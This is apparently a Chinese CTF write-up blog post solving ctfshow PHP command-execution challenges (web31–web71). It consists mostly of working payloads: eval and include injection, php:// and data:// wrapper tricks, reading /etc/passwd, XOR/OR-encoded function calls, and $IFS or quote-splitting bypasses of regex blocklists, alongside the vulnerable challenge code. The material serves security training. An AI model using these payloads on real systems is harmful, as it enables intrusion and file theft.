+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;cp fla?.php 1.txt&quot;);</span><br><span class="line">?c=system(&quot;mv fla?.php 1.txt&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>cp:复制文件<br>mv:移动文件，在同一个目录内对文件进行剪切的操作，实际应理解成重命名操作<br>然后访问1.txt即可</p>
+<p><img src="/img/image-20231103171911467.png" alt="image-20231103171911467"></p>
+<p>3、当使用file_get_contents()函数需要输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo file_get_contents(&quot;1.txt&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>4、注意题目中是eval的时候一定要在代码后面加上&#96;。反引号和system&#x3D;反引号+echo</p>
+<h3 id="WEB31"><a href="#WEB31" class="headerlink" title="WEB31"></a>WEB31</h3><p><img src="/img/image-20231103205530367.png" alt="image-20231103205530367"></p>
+<p>方法一：经典参数逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>方法二：直接绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo%09`tac%09fl*`;  </span><br></pre></td></tr></table></figure>
+
+<p>方法三：构造无参数</p>
+<p>localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(pos(localeconv()))); </span><br></pre></td></tr></table></figure>
+
+<p>可以看到当前目录下有flag.php。 </p>
+<p><img src="/img/image-20231103210617480.png" alt="image-20231103210617480"></p>
+<p>通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231103210652828.png" alt="image-20231103210652828"></p>
+<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p><img src="/img/image-20231103203049540.png" alt="image-20231103203049540"></p>
+<p>过滤了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br><span class="line">system</span><br><span class="line">php</span><br><span class="line">cat</span><br><span class="line">sort</span><br><span class="line">shell</span><br><span class="line">.</span><br><span class="line"> </span><br><span class="line">&#x27;</span><br><span class="line">`</span><br><span class="line">echo</span><br><span class="line">;</span><br><span class="line">(</span><br></pre></td></tr></table></figure>
+
+<p>并且是区分大小写的</p>
+<p>如果要使用下面这个payload，势必要绕过（过滤，暂时不会</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[1]);&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>代码解释：第一个分号是因为外层还有一个eval，第二个分号是内层的eval</p>
+<p>所以我们考虑其他方法。同样是传参嵌套在，这里使用的是include+伪协议读取。注意；被过滤了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231103203841690.png" alt="image-20231103203841690"></p>
+<p>为什么要测试这个地址的文件读取呢</p>
+<p>因为Linux系统中的 &#x2F;etc&#x2F;passwd文件,是系统用户配置文件,存储了系统中所有用户的基本信息,并且所有用户都可以对此文件执行读操作，测试了是否可以进行文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>include后面的%0a可以不用，这里的include如果被过滤也要想到使用require、require_once、include_once来替代</p>
+<p>拿到flag</p>
+<p>ps:为什么<code>$_GET[&#39;1&#39;]</code>可以写成<code>$_GET[1]</code>,因为php可以向下兼容</p>
+<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p><img src="/img/image-20231103235954752.png" alt="image-20231103235954752"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看到文件包含就要想到伪协议</p>
+<p>如果php被过滤可以使用短标签,但是有时候短标签没有开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&quot;mv fla?.??? 1.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>include后面虽然拼接了.php，但不影响前面<code>&lt;?php phpinfo();?&gt;</code>执行，这是文件包含的特性了</p>
+<p><img src="/img/image-20231104001130588.png" alt="image-20231104001130588"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><p>这题过滤了括号，但是是中文的括号，注意辨别，所以不影响解题</p>
+<p>可以使用上面无参rce的经典payload，下面是ctfshow博主的题解，比较巧妙，可以学习</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars());   //var_dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231104001910198.png" alt="image-20231104001910198"></p>
+<p>也可以右键源代码更加直观</p>
+<p><img src="/img/image-20231112230337261.png" alt="image-20231112230337261"></p>
+<p><code> get_defined_vars()</code>是一个 PHP 函数，用于获取当前作用域中已定义的所有变量的列表，并将它们存储在一个关联数组中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post传参：1=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231104002343239.png" alt="image-20231104002343239"></p>
+<p>我们可以将数组弹出，来间接获取我们想要的payload，从而达到绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print(array_pop((next((get_defined_vars())))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231104003019833.png" alt="image-20231104003019833"></p>
+<p>我们这里也是直接将post传参改成我们需要的了</p>
+<p><img src="/img/image-20231104003059244.png" alt="image-20231104003059244"></p>
+<p>直接配合嵌套eval函数</p>
+<p>逻辑是内层eval执行返回<code>system(&quot;cat flag.php&quot;);</code>,然后外层eval执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop((next((get_defined_vars())))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231104003153294.png" alt="image-20231104003153294"></p>
+<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><p>方法一：通过脚本自动化实现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过滤了数字和字母，以及 $、+、-、^、~ </span><br><span class="line">使得 异或自增 和 取反 构造字符都无法使用</span><br><span class="line">但是没有过滤 或运算符 |</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">yu师傅的异或脚本</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40345591/article/details/127773706">CTFshow wbe41 教你写脚本</a></p>
+<p>大体上就是通过没有被过滤的可见或者不可见字符的url编码进行异或生成我们需要的被过滤字符，从而构造payload</p>
+<p>方法二：手工构造</p>
+<p>以上相当于使用 python 自动化脚本。当然也可以用上述得到的 txt 可用字符手动构造。rce_or.php会产生一个rce_or.txt文件，里面是可用的url组合。这里象征性地展示一些 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  %00 %20</span><br><span class="line">! %00 %21</span><br><span class="line">&quot; %00 %22</span><br><span class="line"># %00 %23</span><br><span class="line">% %00 %25</span><br><span class="line">&#x27; %00 %27</span><br><span class="line">( %00 %28</span><br><span class="line">) %00 %29</span><br><span class="line">* %00 %2a</span><br><span class="line">, %00 %2c</span><br><span class="line">. %00 %2e</span><br><span class="line">/ %00 %2f</span><br><span class="line">: %00 %3a</span><br><span class="line">; %00 %3b</span><br><span class="line">&lt; %00 %3c</span><br><span class="line">= %00 %3d</span><br><span class="line">&gt; %00 %3e</span><br><span class="line">? %00 %3f</span><br><span class="line">@ %00 %40</span><br><span class="line">\ %00 %5c</span><br><span class="line">_ %00 %5f</span><br><span class="line">` %00 %60</span><br><span class="line">| %00 %7c</span><br><span class="line">! %01 %20</span><br><span class="line">! %01 %21</span><br><span class="line"># %01 %22</span><br><span class="line"># %01 %23</span><br><span class="line">% %01 %25</span><br><span class="line">&#x27; %01 %27</span><br><span class="line">) %01 %28</span><br><span class="line">) %01 %29</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls&#x27;)</span><br><span class="line">(&#x27;system&#x27;)(&#x27;ls&#x27;)</span><br><span class="line">(system)(&#x27;ls&#x27;)</span><br><span class="line">(&#x27;system&#x27;)(ls)</span><br><span class="line">是一样的，都可以执行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c=&#x27;(phpinfo)()&#x27;;</span><br><span class="line">echo($c);</span><br><span class="line">?&gt;</span><br><span class="line">输出：(phpinfo)()</span><br><span class="line">传入：eval(&quot;echo($c);&quot;);</span><br><span class="line">=&gt;eval(&quot;(phpinfo)();&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>所以可以直接构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如构造一个 (system)(&#x27;ls&#x27;)</span><br><span class="line">(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%00%0c%13%00&quot;|&quot;%27%60%60%27&quot;)</span><br><span class="line"></span><br><span class="line">其中 %13|%60=s     %19|%60=y      %14|%60=t</span><br></pre></td></tr></table></figure>
+
+<p>构造(system)(cat flag.php) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>用bp改包，hackbar试过了不行，不知道为什么</p>
+<p><img src="/img/image-20231104130201014.png" alt="image-20231104130201014"></p>
+<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null：</span><br><span class="line">	说明一下 /dev/null 说白了就是写入这个里面的内容都会丢失，读取这里面的内容什么也不会读取到</span><br><span class="line">	而前面的 &gt; 表示重定向代表的是要去哪里</span><br><span class="line">	因为 &gt; 前面没有数值，所以默认的是1，表示标准输出重定向到 /dev/null (空设备文件)</span><br><span class="line">	因此不会显示任何的数据，同时也不会读取到任何的数据</span><br><span class="line">	</span><br><span class="line">2&gt;&amp;1：</span><br><span class="line">	这里的1表示stdout标准输出，系统默认值是1，因此 &gt; 前面没有值的时候就是默认标准输出 1&gt;</span><br><span class="line">	这里的2表示stderr标准错误</span><br><span class="line">	&amp;表示等同于的意思</span><br><span class="line">	在这里这个语句的意思就表示2的输出重定向等同于1，即标准错误输出重定向等同于标准输出</span><br><span class="line">	因为之前标准输出已经重定向到空设备文件，左移标准错误输出也重定向到空设备文件</span><br></pre></td></tr></table></figure>
+
+<p>这整一句话的意思是：让所有输出流(不管你是对的还是错的)都重定向到空设备文件中丢弃掉</p>
+<p>所以关键就是不能让后面这个重定向执行下去就行</p>
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=tac flag.php||	</span><br><span class="line">c=tac flag.php%0a	// %0a是url编码，表示的是换行</span><br><span class="line">c=tac flag.php%26	// %26是url编码，表示的是&amp;符</span><br><span class="line"></span><br><span class="line">此外，php版本小于5的时候因为php的底层是C，所以截断有另外的%00可以使用</span><br></pre></td></tr></table></figure>
+
+<p>要注意的是在url中表示分隔查询参数，浏览器不会对其编码，如果要传输此字符需手动编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))</span><br></pre></td></tr></table></figure>
+
+<p>过滤数字的时候不代表过滤了url编码%09这样的，因为解码后不属于数字,这里%09也不受%过滤的影响</p>
+<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>0x26是&amp;的16进制，0x09是%09的16进制，两个都被过滤</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.php||</span><br><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.ph&#x27;&#x27;p||</span><br><span class="line">?c=tac&lt;&gt;fl&#x27;&#x27;ag.php||</span><br></pre></td></tr></table></figure>
+
+<p>字符串中间加两个单引号，在执行的时候会忽略，命令也可以</p>
+<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=cp$IFS/fla?$IFS/var/www/html/b.txt||</span><br></pre></td></tr></table></figure>
+
+<p>flag在根目录，复制到默认的网页目录var&#x2F;www&#x2F;html，也可以pwd查看目录确定一下</p>
+<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;z.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种过滤了大小写字母（或者还有数字），但是保留了点和问号就可以尝试这种姿势</p>
+<p>不写了，这篇文章讲得很清楚</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40345591/article/details/127791317">https://blog.csdn.net/qq_40345591/article/details/127791317</a></p>
+<p><img src="/img/image-20231112202231149.png" alt="image-20231112202231149"></p>
+<p><img src="/img/image-20231112202139950.png" alt="image-20231112202139950"></p>
+<p>要注意的是%20，@-[，不要写]</p>
+<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=echo file_get_contents(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><p>法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;flag.php&#x27;); </span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include $_GET[1];</span><br><span class="line">?1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>法三：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include &#x27;flag.php&#x27;;echo $flag;</span><br><span class="line">c=include(&#x27;flag.php&#x27;);echo $flag;</span><br></pre></td></tr></table></figure>
+
+<p>法四：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;flag.php&#x27;);var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure>
+
+<p>包含了flag.php，那么 $flag变量就会被注册进去</p>
+<p><img src="/img/image-20231112230712077.png" alt="image-20231112230712077"></p>
+<p>法五：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=rename(&quot;flag.php&quot;,&quot;1.txt&quot;);  //然后访问1.txt</span><br></pre></td></tr></table></figure>
+
+<p>法六：虽然这题被过滤，但是可以积累一下</p>
+<p>curl实现get和post:<a target="_blank" rel="noopener" href="https://www.php.cn/c10-1.html">https://www.php.cn/c10-1.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//初始化</span><br><span class="line">　　$ch = curl_init();</span><br><span class="line">　　//设置选项，包括URL</span><br><span class="line">　　curl_setopt($ch, CURLOPT_URL, &quot;http://www.learnphp.cn&quot;);</span><br><span class="line">　　curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">　　curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">　　//执行并获取HTML文档内容</span><br><span class="line">　　$output = curl_exec($ch);</span><br><span class="line">　　//释放curl句柄</span><br><span class="line">　　curl_close($ch);</span><br><span class="line">　　//打印获得的数据</span><br><span class="line">　　print_r($output);</span><br></pre></td></tr></table></figure>
+
+<p>利用：修改<code>&quot;http://www.learnphp.cn&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$ch = curl_init();curl_setopt($ch, CURLOPT_URL, &quot;file:///var/www/html/flag.php&quot;);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);$output = curl_exec($ch);curl_close($ch);print_r($output);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231112234238787.png" alt="image-20231112234238787"></p>
+<p>被过滤了</p>
+<h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20231112234746414.png" alt="image-20231112234746414"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231112234828265.png" alt="image-20231112234828265"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;../../../&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231112234920206.png" alt="image-20231112234920206"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>ctfshow{45196993-0443-457f-912f-ce1bbb25c890}</p>
+<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>下载题目附件,内容如下：</p>
